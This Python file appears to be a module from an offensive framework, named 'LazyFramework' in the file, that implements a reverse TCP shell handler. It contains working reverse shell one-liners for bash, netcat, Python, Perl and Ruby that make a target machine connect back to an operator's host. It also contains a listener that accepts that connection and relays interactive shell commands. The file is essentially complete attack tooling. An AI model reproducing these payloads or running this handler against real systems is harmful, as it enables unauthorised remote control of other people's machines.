#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import uuid
from typing import Dict, Any

MODULE_INFO = {
    'name': 'Reverse TCP Handler',
    'author': 'LazyFramework',
    'description': 'Universal reverse TCP listener with session management (bash, python, nc, perl, ruby)',
    'rank': 'Excellent',
    'platform': 'multi',
    'arch': 'multi',
    'dependencies': [],
    'references': []
}

OPTIONS = {
    'LHOST': {
        'description': 'Local IP to listen on',
        'required': True,
        'default': '0.0.0.0'
    },
    'LPORT': {
        'description': 'Local port to listen on',
        'required': True,
        'default': '4444'
    },
    'PAYLOAD': {
        'description': 'Payload type: bash, nc, python, perl, ruby',
        'required': False,
        'default': 'bash'
    },
    'TIMEOUT': {
        'description': 'Listener timeout (seconds, 0 = no timeout)',
        'required': False,
        'default': '300'
    }
}

# === Payload Templates ===
PAYLOADS = {
    'bash': 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    'nc': 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f',
    'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''',
    'perl': 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
}

# === Output ke Session Tab (GUI Only) ===
def print_to_session(session: Dict[str, Any], session_id: str, text: str):
    """Output ke Session tab GUI, fallback ke console utama"""
    gui = session.get('gui_instance')
    if gui and hasattr(gui, 'append_session_output'):
        gui.append_session_output(session_id, text)
    else:
        # Fallback ke console utama
        try:
            from rich.console import Console
            Console().print(text)
        except:
            print(text)

# === Payload Generator ===
def generate_payload(options: Dict[str, Any]) -> str:
    payload_type = options.get('PAYLOAD', 'bash').lower()
    template = PAYLOADS.get(payload_type, PAYLOADS['bash'])
    return template.format(LHOST=options['LHOST'], LPORT=options['LPORT'])

# === Listener Thread ===
def listener_thread(session: Dict[str, Any], options: Dict[str, Any]):
    host = options['LHOST']
    port = int(options['LPORT'])
    timeout = int(options.get('TIMEOUT', 300))
    session_id = str(uuid.uuid4())[:8]

    # Inisialisasi session di GUI
    gui = session.get('gui_instance')
    if gui and hasattr(gui, 'add_session'):
        gui.add_session(
            session_id=session_id,
            ip=host,
            port=port,
            type='reverse_tcp',
            payload=options['PAYLOAD']
        )

    print_to_session(session, session_id, f"[*] Starting listener on [bold cyan]{host}:{port}[/]")
    print_to_session(session, session_id, f"[*] Payload: [bold yellow]{options['PAYLOAD']}[/]")
    print_to_session(session, session_id, f"[*] Command:\n[bold green]    {generate_payload(options)}[/bold green]\n")

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(1)
        if timeout > 0:
            server.settimeout(timeout)
        print_to_session(session, session_id, f"[+] Listening... (timeout: {timeout}s)" if timeout > 0 else "[+] Listening (no timeout)")

        conn, addr = server.accept()
        print_to_session(session, session_id, f"\n[bold green][+] Connection from {addr[0]}:{addr[1]}[/bold green]\n")
        print_to_session(session, session_id, "[*] Interactive shell. Type 'exit' to quit.\n")

        # Update session status
        if gui and hasattr(gui, 'update_session_status'):
            gui.update_session_status(session_id, 'active', addr[0])

        # Receive thread
        def recv_loop():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    output = data.decode('utf-8', errors='ignore').rstrip()
                    if output:
                        print_to_session(session, session_id, output)
                except:
                    break

        recv_thread = threading.Thread(target=recv_loop, daemon=True)
        recv_thread.start()

        # Send loop
        while True:
            try:
                cmd = input(f"[session:{session_id}] {addr[0]} > ")
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                if cmd.strip():
                    conn.send(cmd.encode() + b'\n')
            except (EOFError, KeyboardInterrupt):
                break
            except Exception as e:
                print_to_session(session, session_id, f"[!] Send error: {e}")
                break

        conn.close()
        server.close()
        print_to_session(session, session_id, "\n[bold yellow][*] Session closed.[/bold yellow]")

        # Update session status
        if gui and hasattr(gui, 'update_session_status'):
            gui.update_session_status(session_id, 'closed')

    except socket.timeout:
        print_to_session(session, session_id, f"\n[bold red][!] Timeout after {timeout}s.[/bold red]")
    except Exception as e:
        print_to_session(session, session_id, f"\n[bold red][!] Error: {e}[/bold red]")
    finally:
        try:
            server.close()
        except:
            pass

# === Main Entry Point ===
def run(session: Dict[str, Any], options: Dict[str, Any]):
    required = ['LHOST', 'LPORT']
    for opt in required:
        if not options.get(opt):
            gui = session.get('gui_instance')
            if gui and hasattr(gui, 'append_output'):
                gui.append_output(f"[bold red][!] Missing: {opt}[/bold red]")
            return

    # Jalankan listener di thread
    thread = threading.Thread(target=listener_thread, args=(session, options), daemon=True)
    thread.start()

    # Keep alive
    try:
        while thread.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        gui = session.get('gui_instance')
        if gui and hasattr(gui, 'append_output'):
            gui.append_output("\n[bold yellow][*] Listener stopped.[/bold yellow]")
